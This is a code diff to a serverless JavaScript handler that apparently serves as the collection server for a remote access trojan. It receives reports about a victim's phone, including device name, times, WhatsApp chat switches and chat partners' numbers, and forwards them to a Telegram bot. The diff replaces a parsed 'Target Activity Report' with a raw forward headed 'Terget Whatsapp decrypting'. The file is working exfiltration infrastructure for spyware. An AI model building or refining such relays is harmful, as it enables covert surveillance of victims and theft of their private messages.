@@ -9,32 +9,28 @@ export default async function handler(request, response) {
     const chatId = process.env.TELEGRAM_CHAT_ID;
 
     if (!expectedApiKey || !botToken || !chatId) {
-        return response.status(500).json({ error: 'Server configuration fucked up' });
+        return response.status(500).json({ error: 'Server config fucked up' });
     }
 
     if (accessKey !== expectedApiKey) {
         return response.status(401).json({ error: 'Unauthorized: Invalid Key' });
     }
 
-    if (!data.message) {
-        return response.status(400).json({ error: 'Message field missing' });
+    const preFormattedMessage = Object.values(data)[0];
+
+    if (!preFormattedMessage || typeof preFormattedMessage !== 'string') {
+        return response.status(400).json({ error: 'RAT is sending garbage.' });
     }
 
     try {
-        const rawMessage = data.message;
-        
-        const device = (rawMessage.match(/\*\*(INFINIX.*?)\*\*/) || [])[1] || 'N/A';
-        const time = (rawMessage.match(/\*\*Time:\*\* ([\d:]+)/) || [])[1] || 'N/A';
-        const event = (rawMessage.match(/\*\*CHAT SWITCHED\*\*/) || ["Unknown Event"])[0].replace(/\*\*/g, '');
-        const number = (rawMessage.match(/\*\*Now Chatting With:\*\* (.*?)$/s) || [])[1] || 'N/A';
+        // Step 1: Clean the message from the RAT
+        const cleanedMessage = preFormattedMessage
+            .replace(/\*\*/g, '')          
+            .replace(/SENT/g, 'send')           
+            .replace(/RECEIVED/g, 'Received'); 
 
-        let formattedMessage = `*🚨 Target Activity Report 🚨*
-
-*📱 Device:* \`${device.trim()}\`
-*🕒 Time:* \`${time.trim()}\`
-*⚡ Event:* \`${event.trim()}\`
-*👤 Target Chat:* \`${number.trim()}\`
-        `;
+        // Step 2: Add your custom header on top
+        const finalMessage = `Terget Whatsapp decrypting 💀🥀\n\n${cleanedMessage}`;
 
         const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
@@ -43,13 +39,13 @@ export default async function handler(request, response) {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: chatId,
-                text: formattedMessage,
-                parse_mode: 'Markdown',
+                text: finalMessage, // Sending the final message with the header
             }),
         });
         
         return response.status(200).json({ status: 'ok' });
     } catch (error) {
-        return response.status(500).json({ error: 'Failed to parse and forward data' });
+        console.error(error);
+        return response.status(500).json({ error: 'Failed to forward message' });
     }
 }
